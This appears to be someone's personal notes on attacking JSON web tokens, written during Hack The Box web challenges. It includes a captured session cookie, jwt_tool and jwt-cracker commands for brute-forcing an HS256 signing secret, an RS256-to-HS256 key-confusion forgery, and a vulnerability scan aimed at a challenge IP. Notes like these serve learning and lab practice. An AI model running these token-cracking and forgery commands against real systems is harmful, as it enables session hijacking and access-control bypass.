

Source: https://portswigger.net/web-security/jwt

 JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can theoretically contain any kind of data, but are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.

Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers. 
____________________________________________________________________________________________________________________________
POST /api/purchase HTTP/1.1
Host: 167.99.202.193:30403
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyX2MzNjQ1NDA3N2QiLCJpYXQiOjE2NjQxMjk4NTR9.fqPQ1VHIeo_kqtbXxYmGx0zOFHXeuRtvPK6qT7eZ_JI

Here, I saw that, in session, there is a base64 encoded information. Decrypting it -> 
{"alg":"HS256","typ":"JWT"}{"username":"tyler_c36454077d","iat":1664129854}~£ÐÕQÈz.*µµñba±Ó3..w®FÛÏ+ª.íæI
So, it is a json using web token. The first part is the header, the second is the data and the third part is the token (signature). So, if I am able to alter information, maybe I can access privileged information.

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. is the firs part
eyJ1c2VybmFtZSI6InR5bGVyX2MzNjQ1NDA3N2QiLCJpYXQiOjE2NjQxMjk4NTR9. is the second part
fqPQ1VHIeo_kqtbXxYmGx0zOFHXeuRtvPK6qT7eZ_JI is the third part.

__________________________________________________________________________________________________________________________

MANIPULATING VALUES - HS256 - SIMETRIC KEY

First, bruteforce the "secret" key used to compute the signature.
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
OR
jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoidGVzdGluZyIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTA5LTMwIDIwOjA4OjI0IiwiaWF0IjoxNjY0NTY5ODg0fQ.jsXbASz0nCVXIeO9u12XFdyE-hw44LPbhJk8G8q1I4I

After finding the key, edit the field inside the JSON Web Token as you prefer.

Finally, finish the token by signing it with the previously retrieved "secret" key.


Source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token


_______________________________________________________________________________________________________________________________________________

JWT KEY CONFUSION - CHANGING FROM ASSIMETRIC KEY TO SIMETRIC KEY
Practicing in htb challenge 'Under construction', I learned a little about key confusiong.
Open jwt.io and copy the public key, replacing all the '\n' with 'enter'. After, paste it on the 'verify signature' part.

python3 jwt_tool.py <JWT> -I -pc name -pv "payload" -S hs256 -k public.key
Here, you are using the public key to validate your credentials, changing the validation method to simetric key (hs256, instead of rs256)

https://pentestbook.six2dez.com/enumeration/webservices/jwt
https://joshuanatan.medium.com/hackthebox-web-under-construction-d60ce177ba9c
___________________________________________________________________________________________________________________________________________________

Basic commands:
1>>
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyX2MzNjQ1NDA3N2QiLCJpYXQiOjE2NjQxMjk4NTR9.fqPQ1VHIeo_kqtbXxYmGx0zOFHXeuRtvPK6qT7eZ_JI
>> this command will show me the basic information (almost the same that I can see, for example, using cyberchef)

Token header values:                                                                                                                                            
[+] alg = "HS256"
[+] typ = "JWT"
Token payload values:                                                                                                                                           
[+] username = "tyler_c36454077d"
[+] iat = 1664129854    ==> TIMESTAMP = 2022-09-25 14:17:34 (UTC)

2>>
python3 jwt_tool.py -t http://167.99.202.193:30403/ -rc 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyX2MzNjQ1NDA3N2QiLCJpYXQiOjE2NjQxMjk4NTR9.fqPQ1VHIeo_kqtbXxYmGx0zOFHXeuRtvPK6qT7eZ_JI' -cv "Welcome" -M pb

this one will scan for vulnerabilities. After that, try the other commands found here: https://github.com/ticarpi/jwt_tool

In this website, you can make some analysis: https://jwt.io/











